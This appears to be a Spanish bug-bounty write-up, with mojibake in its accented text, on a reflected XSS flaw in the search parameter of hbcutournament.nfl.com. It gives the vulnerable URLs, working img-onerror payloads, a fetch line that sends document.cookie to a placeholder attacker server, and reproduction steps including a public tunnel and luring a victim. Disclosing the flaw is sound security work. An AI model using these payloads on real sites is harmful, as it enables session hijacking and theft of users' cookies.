---
layout: default
---

<div class="container">
<article>
  <a href="../../../es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>
  <div class="lang-switcher">
    <a href="../../../en/bounties/nfl-xss-search-query/" class="lang-btn">English (EN)</a>
    <a href="./" class="lang-btn active">EspaÃƒÂ±ol (ES)</a>
  </div>

  <div class="bounty-header">
    <h1>NFL: XSS Reflejado en ParÃƒÂ¡metro de BÃƒÂºsqueda</h1>
    <p>Vulnerabilidad de Cross-Site Scripting Reflejado en <code>hbcutournament.nfl.com</code> Ã¢â‚¬â€ desde inyecciÃƒÂ³n HTML hasta exfiltraciÃƒÂ³n de cookies de sesiÃƒÂ³n.</p>
  </div>

  <div class="bounty-content">

    <h2>Ã°Å¸Å½Â¯ URLs Afectadas</h2>
<pre><code>https://hbcutournament.nfl.com/resources?q=
https://hbcutournament.nfl.com/blogs?q=</code></pre>
    <p>La aplicaciÃƒÂ³n no sanitiza ni codifica correctamente la entrada del parÃƒÂ¡metro <code>?q=</code> de la URL, permitiendo la inyecciÃƒÂ³n y ejecuciÃƒÂ³n de JavaScript arbitrario en el contexto del navegador.</p>

    <h2>Ã°Å¸â€™â€° InyecciÃƒÂ³n HTML</h2>
    <p>Lo primero que probamos en el campo de bÃƒÂºsqueda fue una inyecciÃƒÂ³n HTML simple. El payload utilizado:</p>
<pre><code>&lt;h1&gt;Esta es una prueba de inyecciÃƒÂ³n HTML&lt;/h1&gt; --- Esto es un texto normal.</code></pre>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20HTML%20Injection.png" alt="InyecciÃƒÂ³n HTML">

    <h2>Ã°Å¸Å¡Â¨ XSS Reflejado</h2>
    <p>Tras probar varios payloads, descubrimos que la etiqueta <code>&lt;img&gt;</code> funciona. El payload utilizado:</p>
<pre><code>&lt;img/src/onerror=alert(8)&gt;</code></pre>
    <p>La URL maliciosa:</p>
    <p><code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=alert(8)&gt;</code></p>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Alert%201.png" alt="Alerta XSS">

    <h2>Ã°Å¸Å¡â‚¬ ExfiltraciÃƒÂ³n de Cookies</h2>
    <p>Tras verificar la ejecuciÃƒÂ³n de JavaScript, intentamos exfiltrar cookies. Este ataque roba las cookies de sesiÃƒÂ³n de cualquier usuario que haga clic en el enlace malicioso.</p>
<pre><code>&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></pre>
    <p>La URL maliciosa:</p>
    <p><code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code></p>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration.png" alt="ExfiltraciÃƒÂ³n de Cookies">
    <p>Las cookies exfiltradas se recibieron con ÃƒÂ©xito en el servidor del atacante:</p>
    <img src="../../../assets/images/nfl-xss-search-query/NFL%20-%20XSS%20Search%20Query%20Parameter%20-%20Cookies%20Exfiltration%20Result.png" alt="Resultado de ExfiltraciÃƒÂ³n">

    <h2>Ã°Å¸Å½Â¯ Pasos para Reproducir</h2>
    <ol>
      <li>Iniciar un Servidor Web:
<pre><code>python3 -m http.server 8000</code></pre>
      </li>
      <li>Iniciar un servidor web pÃƒÂºblico con Serveo en otra pestaÃƒÂ±a de terminal:
<pre><code>ssh -R 80:localhost:8001 serveo.net</code></pre>
      </li>
      <li>Crear una cuenta en <a href="https://hbcutournament.nfl.com/register" target="_blank">hbcutournament.nfl.com/register</a></li>
      <li>Preparar la URL maliciosa:<br>
        <code>https://hbcutournament.nfl.com/resources?q=&lt;img/src/onerror=fetch("http://YOUR-WEB-SERVER/"+encodeURIComponent(document.cookie))&gt;</code>
      </li>
      <li>Compartir la URL maliciosa con otro usuario registrado.</li>
      <li>Recibir las cookies de la vÃƒÂ­ctima en tu servidor Python HTTP.</li>
    </ol>
    <p><strong>Nota:</strong> Cuando el payload es un elemento <code>&lt;img&gt;</code>, la ejecuciÃƒÂ³n puede retrasarse por el timeout. Usa un vector alternativo como <code>onload</code> para ejecuciÃƒÂ³n inmediata.</p>

    <h2>Ã¢Å¡Â Ã¯Â¸Â Impacto de Seguridad</h2>
    <ul>
      <li><strong>Secuestro de SesiÃƒÂ³n:</strong> Robo de cookies de sesiÃƒÂ³n.</li>
      <li><strong>RedirecciÃƒÂ³n de Phishing:</strong> Redirigir a dominios controlados por el atacante.</li>
      <li><strong>Acceso al DOM:</strong> Extraer datos sensibles.</li>
      <li><strong>Robo de Credenciales:</strong> Servir prompts de login falsos mediante inyecciÃƒÂ³n de scripts.</li>
    </ul>

    <h2>Ã°Å¸Â¤Â Detalle de ColaboraciÃƒÂ³n</h2>
    <p>Esta investigaciÃƒÂ³n fue realizada en una <strong>colaboraciÃƒÂ³n al 50%</strong> entre <strong>{{ site.researchers.ivan.name }}</strong> y <strong>{{ site.researchers.diego.name }}</strong>. Ambos contribuyeron equitativamente al descubrimiento, explotaciÃƒÂ³n y documentaciÃƒÂ³n de esta vulnerabilidad.</p>
  </div>
</article>
</div>

<div class="zoom-overlay" id="zoomOverlay" onclick="this.classList.remove('active')">
  <img id="zoomImg" src="" alt="Zoom">
</div>
<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    document.getElementById('zoomImg').src = img.src;
    document.getElementById('zoomOverlay').classList.add('active');
  });
});
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
